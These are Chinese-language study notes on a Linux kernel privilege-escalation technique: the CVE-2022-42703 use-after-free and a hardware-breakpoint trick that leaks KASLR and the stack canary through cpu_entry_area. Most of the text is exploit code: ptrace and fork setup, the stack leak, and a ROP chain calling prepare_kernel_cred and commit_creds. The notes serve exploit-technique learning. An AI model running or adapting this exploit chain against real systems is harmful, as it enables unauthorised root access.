## 大致原理

漏洞利用流程大致如下，可以 LPE（local privilege escalation）
`use after free` -> `arbitrary write` -> use `cpu_entry_area & hard break point` leak -> rop

主要研究就是任意地址写之后如何进行 LPE

## PoC

> 更多的是漏洞利用的学习

### use after free

作者后续将这个漏洞通过cross page attack将struct anon_vma和pipe buffer制造overlap，再结合anon_vma本身的代码（folio_lock_anon_vma_read()）将UAF转化成内核任意地址写。

### arbitrary write

- 假设现在我们有一个**任意地址写入 1 字节**的漏洞，如何利用？

硬断点 + cpu_entry_area.DB_stack.regs.cx

cpu_entry_area 的地址不受kaslr的影响，也就是地址固定。在初始化时，里面会存放着可以泄露kaslr地址。
其中有着处理中断和异常的栈，这里我们主要使用 DB_stack，因为其既可以在用户态，又可以在内核态调用。

用户态触发硬断点
```c
create_hard_bp(addr);
// exc_debug_user() 触发硬断点，将寄存器内容送入 DB_stack
*addr
// uname。在送入DB_stack的同时，内核会调用copy_to/from_user()函数
// 进而触发exc_debug_kernel()，变量是栈上的临时变量，次数由cx寄存器决定
uname(addr)

// 由上述知，内核态调用cpoy_from/to_user函数会触发硬断点
```

- 因此，我们可以控制 regs.cx 就可以拷贝很多数据，从而leak kaslr。

### rop

- 找到一个函数，栈上临时变量的 `copy_from_user()`
- 原文给出的函数为 `prctl`
```c
// >>> kernel/sys.c:2274
SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
 		unsigned long, arg4, unsigned long, arg5)
{

 	switch (option) {

 	case PR_SET_MM:
    // 调用 `prctl_set_mm()`
 		error = prctl_set_mm(arg2, arg3, arg4, arg5);
 		break;
...


static int prctl_set_mm(int opt, unsigned long addr,
 			unsigned long arg4, unsigned long arg5)
{

#ifdef CONFIG_CHECKPOINT_RESTORE
 	if (opt == PR_SET_MM_MAP || opt == PR_SET_MM_MAP_SIZE)
 		return prctl_set_mm_map(opt, (const void __user *)addr, arg4);

....

#ifdef CONFIG_CHECKPOINT_RESTORE
static int prctl_set_mm_map(int opt, const void __user *addr, unsigned long data_size)
{
 	struct prctl_mm_map prctl_map = { .exe_fd = (u32)-1, };

    // 调用copy_from_user，结合任意地址写和硬断点，做到ROP
 	if (copy_from_user(&prctl_map, addr, sizeof(prctl_map)))
 		return -EFAULT;

    // 对prctl_map对象内容进行校验，失败后快速返回触发ROP，不多调用函数
 	error = validate_prctl_map_addr(&prctl_map);
 	if (error)
 		return error;

...
```

- 从上面我们可以看出来这个系统调用的使用 `prctl(PR_SET_MM, PR_SET_MM_MAP, addr, size， arg5)`

### PoC

- [project zero给出下载链接](https://bugs.chromium.org/p/project-zero/issues/attachment?aid=579986&signed_aid=S3BDPxgKy1rISdl1ksH7cg==)。也就是[anonvma_uaf.zip](./anonvma_uaf.zip)

## example

[hbp_attack_demo](https://github.com/veritas501/hbp_attack_demo)

- 漏洞就是：可以给任意地址写一个值

- 漏洞利用流程
1. 父进程fork出子进程victim
2. 父进程ptrace victim，父进程给victim设置硬件断点
3. 父进程fork出子进程trigger，循环触发任意地址写原语修改DEBUG Exception stack中的cx寄存器值
4. victim进程循环调用uname syscall，并检查buffer中是否发现stack leak，如果发现就发送给父进程
5. 父进程拿着stack leak编写出ROP代码发送给victim
6. victim进程循环调用prctl syscall触发目标copy_from_user，直到发生栈溢出ROP提权。

### exploit

1. 初始化工作
```c
void do_init() {
    logd("do init ...");

    // 保存用户态状态。
    init_tf_work();     

    vuln_fd = open("/dev/vuln", O_RDONLY);
    if (vuln_fd < 0) {
        die("open vuln_fd: %m");
    }

    // global mmap
    void *p = mmap(GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) {
        die("mmap: %m");
    }

    if (pipe(sync_pipe[0])) {
        die("pipe: %m");
    }
    if (pipe(sync_pipe[1])) {
        die("pipe: %m");
    }
}
```

2. 创建子进程
```c
switch (child = fork()) {
    case -1:
        die("fork child: %m");
        break;
    case 0:
        // victim child
        fn_child();
        exit(0);
        break;
    default:
        // parent wait child
        waitpid(child, NULL, __WALL);
        break;
    }
```

3. 子进程
```c
void fn_child() {
    logd("child MUST bind to cpu-0");
    bind_cpu(0);

    char *name_buf = (char *)GLOBAL_MMAP_ADDR;
    memset(GLOBAL_MMAP_ADDR, 0, GLOBAL_MMAP_LENGTH);

    // 父进程追踪子进程
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0) {
        die("ptrace PTRACE_TRACEME: %m");
    }

    uint64_t skip_cnt =
        (sizeof(struct utsname) + sizeof(uint64_t) - 1) / sizeof(uint64_t);

    int step = 0;
    bool loop = true;
    while (loop) {
        // 发送 SIGSTOP 子进程在这里停止
        raise(SIGSTOP);


        /* 总共三步
         * 1 触发硬断点，调用copy_to_user()，数据拷贝到 name_buf 这个mmap的地方，并且写入pipe中
         * 2 将rop先写入 GLOBAL_MMAP_ADDR 的地址中
         * 3 将rop chain 写入 prctl 的临时栈。
         */
        switch (step) {
        case 0: {
            // trigger hw_breakpoint and leak data from stack
#if (0)
            *(char *)name_buf = 1; // trigger `exc_debug_user()`
#else
            uname((void *)name_buf); // trigger `exc_debug_kernel()`
#endif
            // check if data leaked
            for (int i = skip_cnt; i < 100; i++) {
                if (((uint64_t *)name_buf)[i]) {
                    logi("child: FOUND kernel stack leak !!");
                    write(sync_pipe[1][1], GLOBAL_MMAP_ADDR,
                          GLOBAL_MMAP_LENGTH);
                    step++;
                    break;
                }
            }
        } break;
        case 1: {
            // build ROP
            logd("child: waiting to recv rop gadget ...");
            read(sync_pipe[0][0], GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH);
            logd("child: recv rop gadget");
            step++;
        } break;
        case 2: {
            // ROP attack
            // 没有step++，循环调用这个
            prctl(PR_SET_MM, PR_SET_MM_MAP, GLOBAL_MMAP_ADDR,
                  sizeof(struct prctl_mm_map), 0);
        } break;
        default:
            break;
        }
    }

    return;
}
```

4. 父进程
```c
// waitpid  等待信号，为child的pid
waitpid(child, NULL, __WALL);
...

    logd("create hw_breakpoint for child");

    // 子进程创建硬断点
    // 地址为 GLOBAL_MMAP_ADDR
    create_hbp(child, (void *)GLOBAL_MMAP_ADDR);

    logd("fork write-anywhere primitive trigger ...");
    // 触发漏洞的进程
    switch (trigger = fork()) {  
    case -1:
        die("fork trigger: %m");
        break;
    case 0:
        fn_trigger();   // 漏洞利用触发：往一个地址写入一个数据。需要绑定其余的CPU。
        exit(0);
        break;
...
```

5. 父进程触发硬断点
```c
while (1) {
        // 让 SIGSROP 的子进程运行下去
        // case 0：触发硬断点，copy_to_user(), leak
        if (ptrace(PTRACE_CONT, child, NULL, NULL) < 0) {
            die("failed to PTRACE_CONT: %m");
        }
        waitpid(child, NULL, __WALL);

        // poll 来查看是否有事件，如果有，说明触发硬断点并且拷贝成功
        int ret = poll(&fds, 1, 0);
        if (ret > 0 && (fds.revents & POLLIN)) {
            read(sync_pipe[1][0], GLOBAL_MMAP_ADDR, GLOBAL_MMAP_LENGTH);
            break;
        }
    }
```

6. leak base && build rop chain
```c
 hexdump(GLOBAL_MMAP_ADDR + sizeof(struct utsname), 0x100);
    uint64_t *leak_buffer =
        (uint64_t *)(GLOBAL_MMAP_ADDR + sizeof(struct utsname));
    uint64_t canary = leak_buffer[0];
    logi("canary: 0x%lx", canary);
    uint64_t leak_kaddr = leak_buffer[4];
    logi("leak_kaddr: 0x%lx", leak_kaddr);
    uint64_t kbase = leak_kaddr - 0xe0b32;
    logi("kbase: 0x%lx", kbase);

    // start build rop gadget ...
    logd("build rop ...");
    uint64_t rop[ROP_START_OFF + ROP_CNT] = {0};
    rop[CANARY_OFF] = canary;
    uint64_t gadget_data = pop_rdi;
    uint64_t rop_buf[ROP_CNT] = {
        // prepare_kernel_cred(0)
        pop_rdi, 0, prepare_kernel_cred,

        // mov qword ptr[somewhere_writable], gadget_data
        pop_rdx, (gadget_data >> (8 * 0)) & 0xff, pop_rdi,
        somewhere_writable + 0, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 1)) & 0xff, pop_rdi, somewhere_writable + 1,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 2)) & 0xff, pop_rdi,
        somewhere_writable + 2, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 3)) & 0xff, pop_rdi, somewhere_writable + 3,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 4)) & 0xff, pop_rdi,
        somewhere_writable + 4, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 5)) & 0xff, pop_rdi, somewhere_writable + 5,
        dl_to_rdi, pop_rdx, (gadget_data >> (8 * 6)) & 0xff, pop_rdi,
        somewhere_writable + 6, dl_to_rdi, pop_rdx,
        (gadget_data >> (8 * 7)) & 0xff, pop_rdi, somewhere_writable + 7,
        dl_to_rdi,

        // mov rdi, rax
        pop_rcx, somewhere_writable, push_rax_jmp_qword_rcx,

        // commit_creds(cred)
        commit_creds,

        // return to userland
        kpti_trampoline,
        // frame
        0xdeadbeef, 0xbaadf00d, user_ip, user_cs, user_eflags,
        user_sp & 0xffffffffffffff00, user_ss
    };
    memcpy(rop + ROP_START_OFF, rop_buf, sizeof(rop_buf));

    logd("send rop gadget to victim child ...");
    write(sync_pipe[0][1], rop, sizeof(rop));
```

7. 子进程继续执行
```c
while (1) {
        // 在子进程 child 中，因为每次都会 SIGSTOP，使用 PTRACE_CONT 让子进程继续执行
        // case 1: rop 写入到 GLOBAL_MMAP
        // case 2: rop 写入到函数调用栈的临时变量，从而在ret时ROP
        if (ptrace(PTRACE_CONT, child, NULL, NULL) < 0) {
            die("failed to PTRACE_CONT: %m");
        }
        waitpid(child, NULL, __WALL);
    }
```


## 参考

[借助硬断点提权](https://veritas501.github.io/2023_03-22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/#%E5%89%8D%E6%96%87)
[Project Zero CVE-2022-42703 Bringing back the stack attack](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html)
[bug report](https://bugs.chromium.org/p/project-zero/issues/detail?id=2351)